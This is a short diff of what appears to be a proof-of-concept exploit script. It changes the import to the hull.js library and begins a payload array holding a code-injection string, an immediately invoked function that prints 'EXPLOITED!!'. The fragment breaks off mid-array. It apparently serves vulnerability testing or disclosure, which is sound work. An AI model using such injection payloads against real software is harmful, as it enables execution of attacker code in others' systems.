@@ -1,4 +1,4 @@
-const hull = require('./vulnerable_slice');
+const hull = require("hull.js");
 
 const payload = [
   '[(()=>{ console.log("EXPLOITED!!"); return "x"; })()]',
